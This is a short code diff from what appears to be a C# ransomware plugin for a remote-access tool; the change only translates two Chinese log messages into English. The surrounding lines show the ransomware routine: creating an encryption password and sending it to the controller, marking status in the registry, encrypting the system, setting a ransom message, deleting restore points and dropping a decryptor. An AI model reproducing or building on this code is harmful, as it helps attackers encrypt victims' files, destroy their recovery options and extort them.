@@ -124,7 +124,7 @@ namespace Plugin.Handler
             {
                 password = CreatePassword(15);
                 Connection.Send(Password(password));
-                Packet.Log(Connection.Hwid + "加密中...");
+                Packet.Log(Connection.Hwid + "Encrypting...");
                 Thread.Sleep(1000);
                 Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Encryption in progress...");
                 System_Driver(password);
@@ -135,7 +135,7 @@ namespace Plugin.Handler
                 SetMessage();
                 DeleteRestorePoints();
                 DropDecryptor();
-                Packet.Log(Connection.Hwid+"加密成功");
+                Packet.Log(Connection.Hwid+ "Encrypted");
             }
             catch (Exception ex)
             {
